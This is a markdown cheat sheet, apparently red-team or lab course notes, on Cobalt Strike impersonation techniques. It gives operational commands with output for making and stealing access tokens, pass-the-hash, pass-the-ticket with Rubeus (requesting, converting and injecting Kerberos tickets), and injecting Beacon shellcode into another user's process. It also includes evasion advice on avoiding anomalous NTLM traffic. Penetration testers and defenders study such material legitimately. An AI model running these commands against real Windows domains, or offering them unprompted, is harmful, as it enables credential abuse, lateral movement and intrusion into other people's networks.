# Impersonation (Cobalt Strike)

---

## Make Token

Creates an access token using plaintext credentials. No impact on local actions - only affects network interactions.

**Does NOT require high integrity.**

```
make_token INLANEFREIGHT\tmorgan Passw0rd!
[+] Impersonated INLANEFREIGHT\tmorgan (netonly)

ls \\ilf-ws-1\c$
```

---

## Steal Token

Steals the primary access token from a process running as a different user.

**Requires high integrity.**

```
ps

 PID   PPID  Name                       Arch  Session     User
 ---   ----  ----                       ----  -------     ----
 5248  1864  cmd.exe                    x64   0           INLANEFREIGHT\tmorgan
 5256  5248      conhost.exe            x64   0           INLANEFREIGHT\tmorgan
 5352  5248      mmc.exe                x64   0           INLANEFREIGHT\tmorgan
 
steal_token 5248
[+] Impersonated INLANEFREIGHT\tmorgan
```

---

## Token Store

Permanently holds a reference to tokens, even after the original process closes.

```
# Steal and store token
token-store steal 5248

[*] Stored Tokens

 ID   PID   User
 --   ---   ----
 0    5248  INLANEFREIGHT\tmorgan
 
# Use stored token
token-store use 0
[+] Impersonated INLANEFREIGHT\tmorgan

# Other commands
token-store show
token-store remove
token-store remove-all
```

---

## Pass the Hash (Avoid if Possible)

> ⚠️ **Prefer Pass the Ticket** - NTLM is anomalous and may be restricted in hardened environments.

```
pth INLANEFREIGHT\tmorgan fc525c9683e8fe067095ba2ddc971889
```

---

## Pass the Ticket

Superior to PtH:
- Kerberos auth is not anomalous
- Not restricted like NTLM
- Uses native Windows APIs (doesn't patch LSASS)
- Not prevented by PPL

### Request TGT with AES256

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:tmorgan /domain:INLANEFREIGHT.LOCAL /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap
```

> Using NTLM hash returns RC4-encrypted tickets (not advisable).

### Inject TGT (kerberos_ticket_use)

Requires `.kirbi` file on the CS client machine.

**Convert base64 ticket to .kirbi:**
```powershell
$ticket = "doIFo[...snip...]kNPTQ=="
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\tmorgan.kirbi", [Convert]::FromBase64String($ticket))
```

> ⚠️ Injecting a TGT **overwrites** any existing ticket in the logon session.

**Create new logon session first (fake password):**
```
make_token INLANEFREIGHT\tmorgan FakePass
kerberos_ticket_use C:\Users\Attacker\Desktop\tmorgan.kirbi
```

### Inject TGT (Rubeus Method)

Rubeus `ptt` accepts base64 tickets directly and works with both TGTs and service tickets.

**Create hidden process in new logon session:**
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:tmorgan /domain:INLANEFREIGHT.LOCAL /password:FakePass

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x132ef34 /ticket:<base64-ticket>

steal_token <PID>
```

### The getuid Confusion

> `steal_token` and `getuid` return the username from the **primary access token**, not the impersonated user from PtT/PtH. This is expected behavior.

---

## Process Injection

Inject Beacon shellcode directly into a process owned by another user.

**Requires high integrity.**

```
ps

 PID   PPID  Name                       Arch  Session     User
 ---   ----  ----                       ----  -------     ----
 5248  1864  cmd.exe                    x64   0           INLANEFREIGHT\tmorgan

inject 5248 x64 http
```

---

## Drop Impersonation

```
rev2self
```

---

## Quick Reference

| Technique | Requirements | Use Case |
|-----------|--------------|----------|
| `make_token` | Plaintext creds | Network access as user |
| `steal_token` | High integrity + target process | Impersonate logged-in user |
| `token-store` | High integrity | Persistent token reference |
| `pth` | NTLM hash | Legacy/last resort |
| Pass the Ticket | AES256/NTLM hash | Preferred impersonation |
| `inject` | High integrity + target process | Full Beacon as user |
